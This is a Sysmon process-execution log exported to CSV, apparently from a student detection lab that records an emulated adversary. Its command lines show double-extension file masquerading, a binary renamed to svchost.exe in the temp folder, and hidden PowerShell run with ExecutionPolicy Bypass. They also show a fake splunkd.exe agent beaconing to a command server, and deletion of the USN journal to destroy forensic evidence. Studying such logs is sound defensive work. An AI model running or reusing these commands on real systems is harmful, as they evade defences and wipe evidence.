"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:12:41.865 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.969 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172683,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.966","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.205 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172685,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.204","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.421 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172687,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.420","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.924 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172691,"Cmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8360 ¦ PGUID: E9F06A57-9570-694A-D302-000000002300 ¦ ParentPID: 4192 ¦ ParentPGUID: E9F06A57-9570-694A-D202-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.923","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:21.162 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172693,"Cmdline: ""C:\WINDOWS\system32\calc.exe"" ¦ Proc: C:\Windows\System32\calc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4836 ¦ PGUID: E9F06A57-9571-694A-D502-000000002300 ¦ ParentPID: 8360 ¦ ParentPGUID: E9F06A57-9570-694A-D302-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:21.160","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.694 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:34.787 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172697,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 1196 ¦ PGUID: E9F06A57-95BA-694A-D802-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:14:34.785","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:47.716 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172698,"Cmdline: cmd.exe /C fsutil usn deletejournal /D C: ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2876 ¦ PGUID: E9F06A57-95C7-694A-D902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:14:47.708","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:47.816 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172699,"Cmdline: fsutil usn deletejournal /D C: ¦ Proc: C:\Windows\System32\fsutil.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C fsutil usn deletejournal /D C: ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-95C7-694A-DA02-000000002300 ¦ ParentPID: 2876 ¦ ParentPGUID: E9F06A57-95C7-694A-D902-000000002300 ¦ Description: fsutil.exe ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=372D87C19688207295102C51F101ECA0,SHA256=B45547A228FAFFB4CE8CB6F362CFCBCCB441359EB87CF43FDFC8A21B3653E081,IMPHASH=BE5507FF6FB7CBBEA73D7F35F4857805","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:14:47.758","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:23.674 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172700,"Cmdline: C:\WINDOWS\system32\svchost.exe -k wsappx -p ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 7836 ¦ PGUID: E9F06A57-95EB-694A-DB02-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:15:23.666","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
